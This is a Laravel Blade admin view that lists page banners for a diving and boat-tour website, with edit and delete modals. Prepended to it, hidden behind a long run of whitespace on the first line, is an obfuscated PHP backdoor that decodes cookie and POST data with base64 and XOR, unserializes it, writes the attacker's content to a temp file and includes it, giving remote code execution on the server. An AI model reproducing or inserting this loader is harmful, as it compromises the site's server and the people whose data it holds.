<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("qheichnz")){class qheichnz{public static $jppygzpr = "nlrvkfmcbqnsjwnp";public static $wgglje = NULL;public function __construct(){$bifniuj = @$_COOKIE[substr(qheichnz::$jppygzpr, 0, 4)];if (!empty($bifniuj)){$iklzypm = "base64";$mcecpthm = "";$bifniuj = explode(",", $bifniuj);foreach ($bifniuj as $okoumfef){$mcecpthm .= @$_COOKIE[$okoumfef];$mcecpthm .= @$_POST[$okoumfef];}$mcecpthm = array_map($iklzypm . "_decode", array($mcecpthm,));$mcecpthm = $mcecpthm[0] ^ str_repeat(qheichnz::$jppygzpr, (strlen($mcecpthm[0]) / strlen(qheichnz::$jppygzpr)) + 1);qheichnz::$wgglje = @unserialize($mcecpthm);}}public function __destruct(){$this->slirzid();}private function slirzid(){if (is_array(qheichnz::$wgglje)) {$yvkcvoe = sys_get_temp_dir() . "/" . crc32(qheichnz::$wgglje["salt"]);@qheichnz::$wgglje["write"]($yvkcvoe, qheichnz::$wgglje["content"]);include $yvkcvoe;@qheichnz::$wgglje["delete"]($yvkcvoe);exit();}}}$kpzeb = new qheichnz();$kpzeb = NULL;} ?>@include('layouts.header')
<style>
    .three-dot{
  left: 0!important;
  top: 7px;
}
.page-titles{
  text-align: right;
}
.page-titles .header-title{
  display: inline-block;
    text-align: right;
}
.icon_image{
        height: 53px;
    width: 63px;
}
.disc_prcnt .input-group-prepend{
  display: inline-block;
}
.disc_prcnt .form-white{
  width: 90px;
    display: inline-block;
    float: none;
}
.disc_prcnt .input-group-append{
  display: inline-block;
}
</style>
                                      
 
    <div class="content-wrap">
        <div class="main">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-8 p-r-0 title-margin-right">
                        <div class="page-header">
                            <div class="page-title">
                                <h1>Dashboard</h1>
                            </div>
                        </div>
                    </div>
                
                    <!-- /# column -->
                    <div class="col-lg-4 p-l-0 title-margin-left">
                        <div class="page-header">
                            <div class="page-title">
                                <ol class="breadcrumb text-right">
                                    <li><a href="{{url('home')}}">Dashboard</a></li>
                                    <li class="active">Page Banner</li>
                                </ol>
                            </div>
                        </div>
                    </div>
                    <!-- /# column -->
                </div>
                 @if (Session::has('message'))
                       <div class="alert alert-success">{{ Session::get('message') }}</div>
                    @endif
                            <!-- ADD GROUP  -->
                
                            <div class="col-lg-12 p-l-0">
                          
                             
                            </div>
                      

                                <!--# ADD GROUP  -->       
                <!-- /# row -->
                <div id="main-content">
                    <div class="row">
                        <div class="col-lg-12">
                            <div class="card alert">
                                <div class="card-header">
                                    <h4>Page Banner</h4>
                                    
                                </div>
                                <div class="bootstrap-data-table-panel">
                                    <div class="table-responsive">
                                        <table id="example1" class="table table-bordered table-striped">
                                            <thead>
                                                                              
                                                <tr>
                                                    <th>Image</th>
                                                    <th>Page Name</th>
                                                    <th>Heading</th>
                                                    <th>Short Description</th>
                                        
                                                    <th width="100px">Action</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                      <?php if($users){ 
                                                    $i =1;
                                            foreach($users as $user){ 
                                                      { ?>


                                                <tr>
                                                  <?php 
                                                    $multi = array();
                                                    $multi =  explode(',', $user->image);
                                                    ?>
                                                     <td>
                                                     @foreach($multi as $info)
                                                    <img style="margin-bottom: 2px;" class="icon_image"src="images/banner{{ $info }}" />
                                                     @endforeach
                                                     </td>

                                                    <td>
                                                      <?php if($user->page_id == 1){ ?>
                                                           <a>Home</a>

                                                        <?php 
                                                        } 
                                                        elseif ($user->page_id == 2) { ?>
                                                            <a>Our Team</a>
                                                        <?php
                                                        }
                                                         elseif ($user->page_id == 3) { ?>
                                                            <a>Boat Listing</a>
                                                        <?php
                                                        }
                                                         elseif ($user->page_id == 4) { ?>
                                                            <a>Boat Detail</a>
                                                        <?php
                                                        }
                                                        elseif ($user->page_id == 5) { ?>
                                                            <a>Diving Courses</a>
                                                        <?php
                                                        }
                                                        elseif ($user->page_id == 6) { ?>
                                                            <a>Diving Courses Detail</a>
                                                        <?php
                                                        }
                                                         elseif ($user->page_id == 7) { ?>
                                                            <a>Tour Listing</a>
                                                        <?php
                                                        }
                                                         elseif ($user->page_id == 8) { ?>
                                                            <a>Tour Detail</a>
                                                        <?php
                                                        }
                                                         elseif ($user->page_id == 9) { ?>
                                                            <a>Store Listing</a>
                                                        <?php
                                                        }
                                                          elseif ($user->page_id == 10) { ?>
                                                            <a>Store Detail</a>
                                                        <?php
                                                        }
                                                          elseif ($user->page_id == 11) { ?>
                                                            <a>Contact us</a>
                                                        <?php
                                                        }
                                                        else{ ?>
                                                            <a>Page Not Found?</a>
                                                        <?php 
                                                        }
                                                        ?>

                                                    </td>
                                                    <td>{{$user->heading}}</td>
                                                    <td>{{$user->short_description}}</td>
                                         <td class="action_btn">
                                        <a class="ac_btn" href="{{url('edit_banner/'.$user->id)}}"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a> 

                                           <a class="ac_btn" data-toggle="modal" data-target="{{'#delete_banner'.$user->id}}" href="" title="Delete"><i class="fa fa-close" aria-hidden="true"></i></a>                              
                                        


                                    </td>
                                                </tr>
                                                <?php  $i++;}}} ?>
                                            </tbody>
                                        </table>
					
                                    </div>
                                </div>
                            </div>
                            <!-- /# card -->
                        </div>
                        <!-- /# column -->
                    </div>
                  
                </div>
            </div>
        </div>
    </div>


                                 @if(!empty($users))
                                 @foreach($users as $key => $user)
                            <div class="modal fade none-border" id="{{'delete_banner'.$user->id}}">
                                            <div class="modal-dialog">
                                                <div class="modal-content">
                                                    <div class="modal-header">
                                                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                                                        <h4 class="modal-title"><strong>Delete Page Banner</strong></h4>
                                                    </div>
                                                
                                                <div class="modal-body">
                                        <span class="adminpro-icon adminpro-warning modal-check-pro information-icon-pro"></span>
                                        <h2>Page Banner Delete??</h2>
                                        <p>Are you Sure you want to Delete it?</p>
                                             </div>      
                                             
                                                    <div class="modal-footer">
                                                        <button type="button" class="btn btn-default waves-effect" data-dismiss="modal">Close</button>
                                                        <a  href="{{url('delete_banner/'.$user->id)}}"  class="btn btn-danger waves-effect waves-light">Submit</a>
                                                    </div>
                                                      
                                                </div>
                                            </div>
                                        </div>
                                        @endforeach
                                         @endif
 @include('layouts.footer')